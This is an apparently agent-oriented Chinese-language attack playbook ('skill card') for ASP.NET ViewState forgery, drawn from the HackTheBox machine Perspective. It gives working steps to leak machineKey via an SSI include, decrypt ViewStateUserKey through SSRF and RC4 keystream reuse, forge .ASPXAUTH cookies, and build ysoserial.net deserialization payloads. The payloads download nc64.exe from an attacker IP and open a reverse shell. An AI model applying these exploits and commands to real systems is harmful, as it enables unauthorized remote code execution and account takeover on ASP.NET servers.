---
name: 'dotnet-viewstate-machinekey-rce'
description: '响应里出现 .ASPXAUTH cookie、POST body 带 __VIEWSTATE,或 web.config 泄露 <machineKey validationKey/decryptionKey>、ViewStateUserKey 以 ENC1: 开头时加载:判能否打→拿 machineKey→解加密的 ViewStateUserKey→ysoserial.net 伪造 ViewState 反序列化 RCE。（检索词：ViewState/__VIEWSTATE/__VIEWSTATEGENERATOR/ViewState 伪造/viewstate-forgery/ViewState 反序列化/viewstate-deserialization/machineKey/machineKey 泄露/machinekey-leak/ViewStateUserKey/ysoserial.net/ysoserial/ASP.NET/TextFormattingRunProperties/ASPXAUTH/反序列化/view state/view-state/dotnet）'
whenToUse: '看到 ASP.NET 的 __VIEWSTATE 或 web.config 里的 machineKey 时加载;拿到 machineKey 却打不动时重点看模式 5'
metadata: { domain: web, tier: T2 }
---

# ASP.NET ViewState / machineKey 伪造 → 反序列化 RCE

> 来自 Insane 官方 WP 逐台回核,**1 台命中**:Perspective。

## 触发信号

- 响应带 `.ASPXAUTH` cookie,或 POST body 里有 `__VIEWSTATE=` / `__VIEWSTATEGENERATOR=` / `__EVENTVALIDATION`
- `web.config` 可读,含 `<machineKey ... validationKey="..." decryptionKey="..." />`
- `appSettings` 里 `ViewStateUserKey` 值以 `ENC1:` 开头(加密态,不是明文)
- 同机有 `SecurePasswordServiceUrl`(如 `http://localhost:8000`),Swagger 暴露 `/encrypt`、`/decrypt`

## 前置验证

```bash
# 是不是 ASP.NET、有没有 ViewState
curl -si http://perspective.htb/Account/Login | grep -iE 'ASPXAUTH|__VIEWSTATE|__VIEWSTATEGENERATOR'
# ViewStateUserKey 是否被设:设了就必须先解密,否则伪造必失败
```

## 模式 1: 先判定能不能打

| 观察到 | 含义 | 下一步 |
|---|---|---|
| `__VIEWSTATE` + 无 `ViewStateUserKey` | machineKey 单独够用 | 模式 4 |
| `__VIEWSTATE` + `ViewStateUserKey=ENC1:...` | 签名掺了 userkey | 必须先模式 3 |

🔴 `__VIEWSTATEGENERATOR` 是**路径相关**的固定值,不能瞎猜:登录页 `CD85D8D2`,换页面就变。只能从目标真实请求里抄。

## 模式 2: 拿 machineKey —— 任意文件读 / 源码泄露 / web.config 被包含

条件:有 LFI、任意文件读,或上传能触发 SSI。

Perspective 的路径:上传只允许 JPEG,手动把 `Content-Type` 改成 `image/jpeg` 后 `.shtml` 被接受 → SSI 注入。`exec` 被禁用,但 `include` 可用:`<!--#include file="../web.config"-->`

上传 `conf.shtml` 后在 `/Products/ProductList` 拿到链接,`web.config` 被包含回显(同一份配置里含加密的 `ViewStateUserKey` 与 `SecurePasswordServiceUrl`):

```xml
<machineKey compatibilityMode="Framework20SP2" validation="SHA1" decryption="AES"
validationKey="99F1108B685094A8A31CDAA9CBA402028D80C08B40EBBC2C8E4BD4B0D31A347B0D650984650B24828DD120E236B099BFDD491910BF11F6FA915BF94AD93B52BF"
decryptionKey="B16DA07AB71AB84143A037BCDD6CFB42B9C34099785C10F9" />
<add key="ViewStateUserKey" value="ENC1:<REDACTED>" />
```

`compatibilityMode="Framework20SP2"` / `validation="SHA1"` / `decryption="AES"` 决定模式 4 的 alg 参数。

### HTB 案例
| 机器 | 细节 |
|------|------|
| Perspective | `conf.shtml` + `<!--#include file="../web.config"-->` 一次拿到 machineKey 与加密的 ViewStateUserKey |

## 模式 3: ViewStateUserKey 被加密 → 流密码密钥流复用

条件:`ViewStateUserKey` 是 `ENC1:<base64>`,应用有 `/decrypt`(不可达)/`/encrypt`(可达)。先量长度:`echo -n <REDACTED> | base64 -d | wc -c` → **19**,非块长;FeatherDuster 确认是流密码/XOR。

RC4 即 `C = P xor KS`。**同 key 加密多条消息 = 密钥流复用**,一组已知明文/密文对即可解任意同长密文:`KS = C1 xor P1`,`P2 = C2 xor KS`。

`/decrypt` 只能 POST 不可达,但 `/encrypt` 是 GET,可经 admin 面板 PDF 生成器走 SSRF:

```
<meta http-equiv="refresh" content="0;URL='http://localhost:8000/encrypt?plaintext=PTOfEqOrGreaterLen!'"/>
```

回包 `enc1:3lBSpQNhzuxlbcuNhkH+sXJpkA==` 即 C1,`P1 = b'PTOfEqOrGreaterLen!'`:

```python
import base64
def xor_byte_strings(inputBytes1,inputBytes2):
    return bytes([b1 ^ b2 for b1,b2 in zip(inputBytes1,inputBytes2)])
p1 = b'PTOfEqOrGreaterLen!' #supplied to SSRF PDF
c1 = base64.b64decode('3lBSpQNhzuxlbcuNhkH+sXJpkA==') #retrieved from SSRF PDF
c2 = base64.b64decode('<REDACTED>') # retrieved from web.config
p2 = xor_byte_strings(c2,xor_byte_strings(c1,p1))
print(p2)
print(p2.hex())
# b'<REDACTED>'
# 53416c747973416c7459563165775354615433
```

### HTB 案例
| 机器 | 细节 |
|------|------|
| Perspective | SSRF→`/encrypt` 取 C1;`P1 xor C1 xor C2` 解出 `ViewStateUserKey = <REDACTED>` |

## 模式 4: 用 ysoserial.net 伪造 ViewState

条件:`validationKey` + `decryptionKey` + `ViewStateUserKey` + 正确的 `__VIEWSTATEGENERATOR` 四项齐备。

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd.exe /c ping 10.10.14.20" \
  --decryptionalg="AES" --generator=CD85D8D2 \
  --decryptionkey="B16DA07AB71AB84143A037BCDD6CFB42B9C34099785C10F9" --validationalg="SHA1" \
  --validationkey="99F1108B685094A8A31CDAA9CBA402028D80C08B40EBBC2C8E4BD4B0D31A347B0D650984650B24828DD120E236B099BFDD491910BF11F6FA915BF94AD93B52BF" \
  --viewstateuserkey="<REDACTED>"
```

验证用 `sudo tcpdump -ni tun0 icmp`。把 `-c` 依次换成(每条**单独**发一个请求,不能合成一条):

```bash
-c "cmd.exe /c curl -o \programdata\nc64.exe 10.10.14.20/nc64.exe"
-c "\programdata\nc64.exe 10.10.14.20 7777 -e cmd"
```

输出 URL-encode 后替换 Burp Repeater 里登录请求的 `__VIEWSTATE`(`__VIEWSTATEGENERATOR` 与 `__EVENTVALIDATION` 保持原值):

```
POST /Account/Login HTTP/1.1
__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=<ysoserial 输出>&__VIEWSTATEGENERATOR=CD85D8D2&__EVENTVALIDATION=<原请求保留>&ctl00%24MainContent%24Email=test%40test.htb&ctl00%24MainContent%24Password=ZAQ%212wsx
```
 
### HTB 案例
| 机器 | 细节 |
|------|------|
| Perspective | `-g TextFormattingRunProperties` 拿到 `perspective\webuser`;再读 `C:\Users\webuser\.ssh\id_rsa` 换 SSH 稳定 shell |

## 模式 5: 只有 machineKey、没有 ViewStateUserKey → 不能直接打

🔴 反模式:拿到 machineKey 就急着造 ViewState 是最常见的翻车点。**`ViewStateUserKey` 一旦被设也参与签名**,不解密它,ysoserial 的 payload 一定验签失败(表现是 500 / 事件校验错,不是命令执行)。

此时 machineKey 的正确用法是**伪造 `.ASPXAUTH` cookie** 先把权限提上去(这一步才打开后面的 SSRF 入口),用 aspnetCryptTools 的 FormsEncrypt/FormsDecrypt:

```csharp
string replacedUsername = "admin@perspective.htb";
string forgedUserData = "/";
FormsAuthenticationTicket unencryptedTicket = FormsAuthentication.Decrypt(encryptedTicket);
FormsAuthenticationTicket ticket = new FormsAuthenticationTicket(1, replacedUsername, DateTime.Now,
    DateTime.Now.AddMinutes(1200000000), unencryptedTicket.IsPersistent, forgedUserData, "/");
string encTicket = FormsAuthentication.Encrypt(ticket);
```

`encryptedTicket` 是抓到的现有 cookie;App.config 填同样的 `validationKey`/`decryptionKey` + `validation="SHA1"`/`decryption="AES"`。运行后替换 cookie → 成为 `admin@perspective.htb`,进 `/Admin/Adminhome`。

### HTB 案例
| 机器 | 细节 |
|------|------|
| Perspective | cookie 伪造 → admin 面板 → PDF 生成器 SSRF → 才拿到解 userkey 的 `/encrypt` 预言机 |

## 快速检查清单

```bash
[ ] 请求里有 __VIEWSTATE 吗? __VIEWSTATEGENERATOR 抄对了吗?
[ ] machineKey 从哪来(LFI / SSI include / 备份 / 源码泄露)?
[ ] validationKey + decryptionKey + 两个 alg 四项齐了吗?
[ ] appSettings 里 ViewStateUserKey 是 ENC1: 开头吗?
[ ] /encrypt 或 /decrypt 能走 SSRF / 端口转发到达吗?
```

## 教训

1. **先判 userkey,再谈伪造。** 顺序是 machineKey → (SSRF) 解 userkey → 伪造 ViewState;有 `ViewStateUserKey` 时 machineKey 单独不够。
2. **`ENC1:` 前缀 + 非块长密文 = 流密码信号。** 应用自带的加密端点就是免费的密钥流预言机;`__VIEWSTATEGENERATOR` 只能抄不能猜,payload 按顺序单独提交。

## 相关卡

- `crypto-classic-attack-patterns` —— 密钥流复用 / padding oracle 的通用母卡
- `dotnet-pipe-yaml-deserialization` —— 另一个 .NET 反序列化 gadget 面
- `java-native-deserialization` —— 同思路的 Java 侧(rO0AB / ysoserial jar),别混用 gadget
- `ssrf-protocol-matrix` —— 模式 3 只用 `http://localhost`,内网探测转这里
